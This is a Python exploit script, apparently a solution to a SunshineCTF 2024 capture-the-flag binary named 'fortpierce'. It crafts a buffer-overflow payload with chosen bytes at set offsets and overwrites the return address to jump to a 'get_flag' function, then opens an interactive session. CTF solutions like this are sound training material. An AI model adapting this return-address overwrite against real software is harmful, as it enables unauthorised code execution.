#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./fortpierce")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("2024.sunshinectf.games", 24606)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    payload = b""
    payload += ptr.p8(0x66)
    payload += b"A" * (0x32 - 1)
    payload += ptr.p8(0x75)
    payload += b"A" * (0x26 - 1)
    payload += ptr.p8(0x7A)
    # input(">> ")
    # io.sendline(payload)

    data = {
        0xAE: 0x75,
        0x88: 0x7A,
        0xD4: 0x7A,
        0xD7: 0x79,
        0x91: 0x73,
        0xB1: 0x6F,
        0xB8: 0x63,
        0x86: 0x6B,
        0xC0: 0x73,
    }

    payload = [b"\x66"]
    for key, value in data.items():
        offset = 0xE0 - key
        if len(payload) <= offset:
            for i in range(offset - len(payload) + 1):
                payload.append(b"A")
        payload[offset] = ptr.p8(value)

    payload = b"".join(payload)

    read_flag = unwrap(exe.symbol("get_flag"))

    payload = payload.ljust(0x70, b"A")
    payload += ptr.p64(read_flag ^ 8)

    io.sendline(payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
